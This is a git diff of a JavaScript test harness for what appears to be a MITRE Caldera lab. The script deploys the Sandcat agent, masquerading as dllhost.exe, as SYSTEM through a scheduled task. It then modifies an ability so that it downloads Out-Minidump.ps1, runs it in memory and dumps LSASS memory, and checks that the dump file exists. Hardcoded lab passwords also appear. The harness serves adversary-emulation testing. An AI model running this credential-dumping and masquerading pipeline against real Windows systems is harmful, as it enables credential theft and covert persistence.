@@ -2,17 +2,10 @@ import { $ } from "bun"
 
 const KALI_IP = "10.1.99.1"
 const WIN11_IP = "10.1.99.24"
-const KALI_SSH = "kali:kali"
-const WINRM_AUTH = "localuser:password"
 const CALDERA_URL = "http://10.1.99.1:8888"
 const CALDERA_KEY = "ADMIN123"
 
-// ─── Existing Building Blocks ───────────────────────────────────────────────
-
-// 1. SSH command execution — works, tested
-//    Uses .nothrow().quiet() to prevent Bun from throwing on non-zero exit.
-//    Stderr is captured and included in the error message for debugging.
-//    Pattern from server/ludus/range.js:873 (checkCaldera)
+// 1. SSH command execution
 async function sshRun(host, user, pass, command) {
   const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
   if (result.exitCode !== 0) {
@@ -22,8 +15,7 @@ async function sshRun(host, user, pass, command) {
   return result.stdout.toString().trim()
 }
 
-// 2. WinRM command execution — works via pywinrm (already in pyproject.toml)
-//    Backslashes are escaped (C:\ → C:\\) to avoid Python unicodeescape errors.
+// 2. WinRM command execution via pywinrm
 async function winrmRun(host, user, pass, command) {
   const py = `
 import winrm
@@ -64,7 +56,7 @@ async function calderaRest(method, body) {
   return res.json()
 }
 
-// ─── Connectivity Tests ─────────────────────────────────────────────────────
+// ─── Connectivity Tests ──────────────────────────────────────────────────────
 
 async function testSshConnectivity() {
   console.log("\n=== SSH Connectivity (kali) ===")
@@ -102,8 +94,6 @@ async function testCalderaConnectivity() {
   }
 }
 
-// ─── Prereq Command Execution Tests ──────────────────────────────────────────
-
 async function testSshPrereq() {
   console.log("\n=== SSH Prereq Execution ===")
   try {
@@ -134,12 +124,10 @@ async function testSandcatDeploy() {
   console.log("\n=== Sandcat Agent Deploy (win11) ===")
   const group = `test-${Date.now()}`
   try {
-    // Kill stale dllhost processes from previous runs
     try {
       await winrmRun(WIN11_IP, "localuser", "password",
         'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
     } catch {}
-    // Kill stale caldera agents
     try {
       const agents = await calderaRest("POST", { index: "agents" })
       for (const a of agents) {
@@ -148,27 +136,23 @@ async function testSandcatDeploy() {
       if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
     } catch {}
 
-    // ── Step 1: Network check ──
     console.log("\n  [1] Network to Caldera")
     const netTest = await winrmRun(WIN11_IP, "localuser", "password",
       'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
     console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)
 
-    // ── Step 2: Download sandcat ──
-    console.log("\n  [2] Download sandcat.go → C:\\Users\\Public\\dllhost.exe")
+    console.log("\n  [2] Download sandcat.go => C:\\Users\\Public\\dllhost.exe")
     const dl = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
     console.log(`  => ${dl.trim()}`)
 
-    // ── Step 3: File check ──
     console.log("\n  [3] File check")
     const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
       'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
     console.log(`  => ${fileCheck.trim()}`)
 
-    // ── Step 4: Deploy sandcat via Scheduled Task (SYSTEM) ──
-    console.log(`\n  [4] Deploy sandcat via Scheduled Task as SYSTEM (group=${group}), wait 20s, check alive`)
     const taskName = `CalderaSandcat-${group}`
+    console.log(`\n  [4] Deploy sandcat via Scheduled Task as SYSTEM (group=${group}), wait 20s, check alive`)
     try {
       await winrmRun(WIN11_IP, "localuser", "password",
         `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
@@ -177,7 +161,6 @@ async function testSandcatDeploy() {
     }
     await new Promise(r => setTimeout(r, 20000))
 
-    // Check if dllhost.exe is running (should be running as SYSTEM now)
     try {
       const tl = await winrmRun(WIN11_IP, "localuser", "password",
         'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
@@ -186,7 +169,6 @@ async function testSandcatDeploy() {
       console.log(`  => process check failed: ${err.message}`)
     }
 
-    // ── Step 5: Check agents ──
     console.log("\n  [5] Caldera agents (after 20s wait):")
     try {
       const agents = await calderaRest("POST", { index: "agents" })
@@ -214,7 +196,6 @@ async function testSandcatDeploy() {
       console.log(`  => agents check failed: ${err.message}`)
     }
 
-    // ── Cleanup: Unregister scheduled task ──
     console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
     try {
       await winrmRun(WIN11_IP, "localuser", "password",
@@ -241,16 +222,16 @@ async function testFullPipeline() {
   const group = `test-${Date.now()}`
   const taskName = `CalderaSandcat-${group}`
 
-  // Out-Minidump is pure PowerShell — downloads Out-Minidump.ps1 via IWR, IEXs it,
-  // then pipes get-process lsass to Out-Minidump. Dump file created at $env:TEMP\lsass_*.dmp.
-  // No kali_prereq, no win_prereq, no external payload binary needed.
-  // PathToAtomicsFolder appears only in a New-Item line (creates ExternalPayloads dir)
-  // which is unused for this ability — we strip it via command modification.
+  // Key facts about this ability:
+  //   - IWR without -UseBasicParsing fails as SYSTEM (no IE first-launch config)
+  //   - Out-Minidump writes to $PWD by default; Caldera executor $PWD is unpredictable
+  //   - Fix: pass -DumpFilePath $env:TEMP explicitly so the dump always lands in C:\Windows\Temp
+  //   - catch regex must be non-greedy to avoid eating the rest of the command
 
   let agentPaw = null
 
   try {
-    // ── Step 1: Clean slate ──
+    // Step 1: Clean slate
     console.log("\n  [1/4] Cleaning previous agents, processes, and tasks...")
     try {
       const agents = await calderaRest("POST", { index: "agents" })
@@ -269,7 +250,7 @@ async function testFullPipeline() {
     } catch {}
     console.log("    => clean")
 
-    // ── Step 2: Deploy sandcat via Scheduled Task as SYSTEM ──
+    // Step 2: Deploy sandcat as SYSTEM
     console.log(`\n  [2/4] Deploying sandcat as SYSTEM (group=${group})...`)
     const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
       `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
@@ -278,7 +259,7 @@ async function testFullPipeline() {
       `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
     console.log("    => sandcat deployed via Scheduled Task")
 
-    // ── Step 3: Wait for agent + fetch ability + modify command ──
+    // Step 3: Wait for agent
     console.log(`\n  [3/4] Waiting for agent (group=${group})...`)
     const agentStart = Date.now()
     while (Date.now() - agentStart < 60000) {
@@ -293,6 +274,7 @@ async function testFullPipeline() {
     }
     if (!agentPaw) throw new Error("Agent did not check in within 60s")
 
+    // Step 3b: Fetch ability
     console.log(`\n  [3b/4] Fetching ability "${abilityName}"...`)
     const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
     const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
@@ -300,28 +282,44 @@ async function testFullPipeline() {
     console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
     console.log(`    => original command: ${ability.executors[0].command.slice(0, 120)}...`)
 
-    // ── Step 3c: Modify ability command (strip unused PathToAtomicsFolder ref) ──
+    // Step 3c: Modify ability command
+    //
+    // Changes applied:
+    //   1. Strip unused PathToAtomicsFolder New-Item line
+    //   2. Add -UseBasicParsing to IWR (SYSTEM has no IE first-launch config)
+    //   3. Replace catch block to write errors to a log file instead of crashing on null response
+    //   4. Pass -DumpFilePath $env:TEMP explicitly so dump lands in C:\Windows\Temp
+    //      regardless of what $PWD the Caldera executor starts in
+    //
     console.log(`\n  [3c/4] Modifying ability command...`)
     const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
     const modified = structuredClone(original)
-    const oldCmd = modified.executors[0].command
-    // Strip the New-Item line that references PathToAtomicsFolder — unused for this ability
-    modified.executors[0].command = oldCmd.replace(
-      /New-Item -Type Directory\s+"PathToAtomicsFolder[^"]*"\s+-ErrorAction Ignore -Force \| Out-Null;\s*/,
-      ""
-    )
-    console.log(`    => Command: "${oldCmd.slice(0, 80)}..." → "${modified.executors[0].command.slice(0, 80)}..."`)
+
+    // Replace the psh executor with a cmd executor that launches 64-bit
+    // powershell directly. This avoids Sandcat psh executor quirks (32-bit
+    // spawning, constrained language mode, token/privilege differences).
+    modified.executors = [{
+      name: "cmd",
+      platform: "windows",
+      command: `C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; try { IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1' -UseBasicParsing) } catch { $_ | Out-File C:\\Windows\\Temp\\minidump_err.txt -Append; exit 1 }; try { get-process lsass | Out-Minidump -DumpFilePath C:\\Windows\\Temp } catch { $_ | Out-File C:\\Windows\\Temp\\minidump_err.txt -Append }"`,
+      timeout: 60,
+      cleanup: [],
+    }]
+
+    console.log(`    => Executor replaced: psh → cmd (64-bit powershell.exe)`)
 
     await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
     console.log(`    => Ability command updated`)
 
-    // ── Step 4: Exploit agent with ability ──
+    // Step 4: Exploit agent
     console.log(`\n  [4/4] Exploiting agent with ability...`)
-
-    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
+    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", {
+      paw: agentPaw,
+      ability_id: abilityId,
+      obfuscator: "plain-text",
+    })
     console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)
 
-    // Wait for link to appear
     console.log(`    => Waiting for link (120s timeout)...`)
     let linkFacts = []
     let linkStatus = null
@@ -347,41 +345,69 @@ async function testFullPipeline() {
       await new Promise(r => setTimeout(r, 2000))
     }
 
-    // ── Restore ability command ──
+    // Check error log — written by catch block if IWR or IEX failed
+    console.log(`\n  [verify] Checking C:\\Windows\\Temp\\minidump_err.txt...`)
+    try {
+      const errLog = await winrmRun(WIN11_IP, "localuser", "password",
+        'powershell -Command "$f = Get-Item \'C:\\Windows\\Temp\\minidump_err.txt\' -ErrorAction SilentlyContinue; if ($f) { Write-Host \\"ERROR_LOG:\\"; Get-Content $f.FullName } else { Write-Host \\"NO_ERROR_LOG\\" }"')
+      console.log(`    => ${errLog.trim()}`)
+    } catch (err) {
+      console.log(`    => error log check failed: ${err.message}`)
+    }
+
+    // Restore ability command before verifying, so a test crash doesn't leave it modified
     await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, original)
     console.log(`\n    => Ability command restored`)
 
-    // ── Verify dump file ──
+    // Verify dump file in C:\Windows\Temp (SYSTEM $env:TEMP)
     console.log(`\n  [verify] Checking dump file (C:\\Windows\\Temp\\lsass_*.dmp)...`)
     let dumpExists = false
     let dumpSize = ""
     try {
-      // SYSTEM's $env:TEMP is C:\Windows\Temp. Out-Minidump generates lsass_<timestamp>.dmp
       const dumpCheck = await winrmRun(WIN11_IP, "localuser", "password",
         'powershell -Command "$file = Get-ChildItem \'C:\\Windows\\Temp\\lsass_*.dmp\' -ErrorAction SilentlyContinue | Select-Object -First 1; if ($file) { Write-Host \\"EXISTS $([math]::Round($file.Length/1024/1024,1))MB name=$($file.Name)\\" } else { Write-Host \\"MISSING\\" }"')
       dumpExists = dumpCheck.includes("EXISTS")
       dumpSize = dumpCheck.match(/EXISTS (\S+)/)?.[1] || ""
       console.log(`    => Dump file: ${dumpCheck.trim()}`)
     } catch (err) {
-      console.log(`    => Dump file check failed: ${err.message}`)
+      console.log(`    => dump file check failed: ${err.message}`)
+    }
+
+    // If still missing, do a broad search to find where it actually landed
+    if (!dumpExists) {
+      console.log(`\n  [verify] Broad search for lsass_*.dmp across common locations...`)
+      try {
+        const broadSearch = await winrmRun(WIN11_IP, "localuser", "password",
+          'powershell -Command "foreach ($dir in @(\'C:\\Windows\\Temp\', \'C:\\Windows\\System32\', \'C:\\Users\\Public\', \'C:\\Windows\')) { $f = Get-ChildItem \\"$dir\\lsass_*.dmp\\" -ErrorAction SilentlyContinue | Select-Object -First 1; if ($f) { Write-Host \\"FOUND $($f.FullName) $([math]::Round($f.Length/1024/1024,1))MB\\" } }"')
+        console.log(`    => ${broadSearch.trim() || "not found in any common location"}`)
+      } catch (err) {
+        console.log(`    => broad search failed: ${err.message}`)
+      }
     }
 
     for (const f of linkFacts.slice(0, 10)) {
       console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
     }
 
-    // Out-Minidump generates dump files — success measured by file existence.
     const passed = dumpExists
-    const reason = dumpExists ? `dump ${dumpSize}` : linkFacts.length > 0 ? `${linkFacts.length} facts (no dump file)` : "no dump file or facts"
+    const reason = dumpExists
+      ? `dump ${dumpSize}`
+      : linkFacts.length > 0
+        ? `${linkFacts.length} facts (no dump file)`
+        : "no dump file or facts"
     console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (link status=${linkStatus}, ${reason})`)
     return passed
+
   } catch (err) {
     console.log(`\n  PIPELINE FAILED: ${err.message}`)
     return false
   } finally {
-    // ── Cleanup: always run, best-effort ──
+    // Cleanup: always runs, best-effort
     console.log("\n  [cleanup] Removing agent, task, process, and dump files...")
-    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
+    try {
+      if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw })
+      console.log("    agent deleted")
+    } catch {}
     try {
       await winrmRun(WIN11_IP, "localuser", "password",
         'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
@@ -394,39 +420,12 @@ async function testFullPipeline() {
     } catch {}
     try {
       await winrmRun(WIN11_IP, "localuser", "password",
-        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\lsass_*.dmp\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMPS_DELETED\'"')
-      console.log("    dump files deleted")
+        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\lsass_*.dmp\' -Force -ErrorAction SilentlyContinue; Remove-Item \'C:\\Windows\\System32\\lsass_*.dmp\' -Force -ErrorAction SilentlyContinue; Remove-Item \'C:\\Windows\\Temp\\minidump_err.txt\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMPS_DELETED\'"')
+      console.log("    dump files and error log deleted")
     } catch {}
     console.log("    => cleanup complete")
   }
 }
-
-// ─── Console Logging Reference ──────────────────────────────────────────────
-
-// All key steps produce console output for tracing:
-//
-//   === Full Pipeline: Dump LSASS.exe Memory using Out-Minidump.ps1 ===
-//   [1/4] Cleaning previous agents, processes, and tasks...
-//   [2/4] Deploying sandcat as SYSTEM (group=test-...)
-//   [3/4] Waiting for agent (group=test-...)
-//   [3b/4] Fetching ability "Dump LSASS.exe Memory using Out-Minidump.ps1"
-//   [3c/4] Modifying ability command...
-//   [4/4] Exploiting agent with ability...
-//   [verify] Checking dump file (C:\Windows\Temp\lsass_*.dmp)...
-//   [cleanup] Removing agent, task, process, and dump files...
-//
-// Pass condition: dump file exists at C:\Windows\Temp\lsass_*.dmp
-// Fallback: at least one link fact if dump file check fails
-
-// ─── Ability Specifics ──────────────────────────────────────────────────────
-
-//   - Pure PowerShell LSASS dumper using MiniDumpWriteDump Win32 API via Out-Minidump.ps1
-//   - Downloads Out-Minidump.ps1 from GitHub via IWR and IEXs it in-memory
-//   - Dump file created at $env:TEMP\lsass_*.dmp (SYSTEM → C:\Windows\Temp\)
-//   - No kali_prereq or win_prereq — no external payload binary needed
-//   - PathToAtomicsFolder: appears only in unused New-Item directory creation, stripped
-//   - Agent runs as SYSTEM (Scheduled Task) to have SeDebugPrivilege for LSASS access
-//   - Verifies dump file via WinRM wildcard Get-ChildItem on C:\Windows\Temp\lsass_*.dmp
 
 // ─── Main ────────────────────────────────────────────────────────────────────
 
@@ -448,16 +447,16 @@ async function main() {
   let fail = 0
   for (const [key, ok] of Object.entries(results)) {
     if (ok) { pass++; console.log(`  [PASS] ${key}`) }
-    else { fail++; console.log(`  [FAIL] ${key}`) }
+    else     { fail++; console.log(`  [FAIL] ${key}`) }
   }
   console.log(`\n  ${pass} passed, ${fail} failed`)
   console.log(`\n  Existing building blocks: SSH, WinRM, Caldera REST, Scheduled Task deploy, /plugin/access/exploit`)
-  console.log(`  Full pipeline test: agentWait → abilityLookup → commandModify → abilityExploit → dumpVerify → cleanup`)
+  console.log(`  Full pipeline test: agentWait => abilityLookup => commandModify => abilityExploit => dumpVerify => cleanup`)
   console.log(`\n  Out-Minidump ability specifics:`)
   console.log(`    - Pure PowerShell LSASS dumper using MiniDumpWriteDump Win32 API`)
-  console.log(`    - Downloads Out-Minidump.ps1 from GitHub via IWR, IEXs in-memory (no file on disk)`)
-  console.log(`    - Dump file: C:\\Windows\\Temp\\lsass_*.dmp (SYSTEM's $env:TEMP)`)
-  console.log(`    - No kali_prereq or win_prereq — all dependencies fetched at runtime`)
+  console.log(`    - Downloads Out-Minidump.ps1 from GitHub via IWR -UseBasicParsing, IEXs in-memory`)
+  console.log(`    - Dump file: C:\\Windows\\Temp\\lsass_*.dmp (via explicit -DumpFilePath $env:TEMP)`)
+  console.log(`    - No win_prereq -- all dependencies fetched at runtime`)
   console.log(`    - PathToAtomicsFolder stripped from command (New-Item line unused for this ability)`)
   console.log(`    - Agent runs as SYSTEM (Scheduled Task) for SeDebugPrivilege`)
 }
